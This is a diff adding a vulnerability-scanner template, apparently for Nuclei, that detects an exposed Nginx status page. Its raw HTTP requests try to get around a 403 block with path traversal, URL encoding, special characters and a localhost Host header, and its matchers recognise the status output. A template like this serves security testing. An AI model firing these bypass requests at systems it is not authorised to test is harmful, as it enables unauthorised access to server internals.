@@ -1,0 +1,78 @@
+id: nginx-status-disclosure-bypass
+
+info:
+  name: Nginx Status Disclosure 403 Bypass
+  author: pussycat0x
+  severity: medium
+  description: |
+    Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.
+  reference:
+    - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx
+  metadata:
+    verified: true
+    shodan-query: "server:nginx"
+  tags: nginx,status,disclosure,bypass,misconfig
+
+http:
+  - raw:
+      - |
+        GET /../nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /./nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /.//nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /..;/nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      # URL encoding bypasses
+      - |
+        GET /%2e%2e/nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%252e%252e/nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /%6e%67%69%6e%78_%73%74%61%74%75%73 HTTP/1.1
+        Host: {{Hostname}}
+
+      # Special character bypasses
+      - |
+        GET /;/nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /?/nginx_status HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /nginx_status; HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /nginx_status%20 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /nginx_status/ HTTP/1.1
+        Host: {{Hostname}}
+
+      # Header-based bypasses
+      - |
+        GET /nginx_status HTTP/1.1
+        Host: localhost
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "Active connections:","server accepts handled requests","Reading:","Writing:","Waiting:")'
+        condition: and
